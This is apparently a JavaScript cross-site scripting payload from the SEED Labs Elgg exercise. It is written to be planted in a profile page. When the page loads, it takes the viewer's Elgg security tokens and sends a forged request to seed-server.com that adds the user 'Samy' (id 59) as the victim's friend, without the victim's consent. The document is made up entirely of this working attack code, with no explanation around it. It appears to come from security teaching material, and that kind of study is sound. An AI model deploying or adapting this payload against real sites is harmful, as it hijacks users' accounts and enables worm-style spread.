<script type="text/javascript">
	window.onload = function () {
		var Ajax=null;
		var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
		var token="&__elgg_token="+elgg.security.token.__elgg_token;
		//Construct the HTTP request to add Samy as a friend.
		var id = elgg.get_logged_in_user_guid();
		var sendurl="http://www.seed-server.com/action/friends/add?friend=59" + ts + ts + token +token; //FILL IN

		//Create and send Ajax request to add friend
		if (id !== 59) {
			Ajax=new XMLHttpRequest();
			Ajax.open("GET",sendurl,true);
			Ajax.setRequestHeader("Host","www.seed-server.com");
			Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
			Ajax.send();
		}
	}
</script>